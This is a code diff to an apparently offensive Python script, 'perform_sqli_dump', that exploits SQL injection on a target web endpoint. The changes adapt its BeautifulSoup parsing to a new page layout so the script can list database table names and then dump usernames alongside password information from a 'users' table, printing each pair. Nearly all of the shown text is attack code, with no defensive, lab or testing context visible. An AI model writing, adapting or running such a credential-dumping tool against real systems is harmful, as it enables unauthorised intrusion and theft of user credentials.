@@ -37,14 +37,16 @@ def perform_sqli_dump(target_url):
         return
 
     soup = BeautifulSoup(r.text, 'html.parser')
-    list_items = [item.text for item in soup.find_all('li')]
+    # The new UI renders search results in divs with the class 'user-item'
+    # and the username (or in this case, table name) in a 'user-name' div.
+    result_items = soup.select('div.user-item .user-name')
 
-    if not list_items:
+    if not result_items:
         print("[!] Failed to retrieve table names. The endpoint might be secure or the attack failed.")
     else:
         print("[+] Success! Found tables:")
-        for item_text in list_items:
-            print(f"  - {item_text}")
+        for item in result_items:
+            print(f"  - {item.text.strip()}")
 
     # 2. Dump user credentials
     print("\n[+] Step 2: Attempting to dump user data from 'users' table...")
@@ -57,11 +59,15 @@ def perform_sqli_dump(target_url):
         return
 
     soup = BeautifulSoup(r.text, 'html.parser')
-    user_items = [item.text for item in soup.find_all('li')]
-    if user_items:
-        print("[+] Success! Dumped user data (username):")
-        for item_text in user_items:
-            print(f"  - {item_text}")
+    # Find each 'user-item' div which acts as a container for a result
+    user_divs = soup.select('div.user-item')
+    if user_divs:
+        print("[+] Success! Dumped user data:")
+        for user_div in user_divs:
+            # Within each container, find the specific fields
+            username = user_div.select_one('.user-name').text.strip()
+            password_info = user_div.select_one('.user-status').text.strip()
+            print(f"  - {username} | {password_info}")
     else:
         print("[!] Could not dump user data.")
 
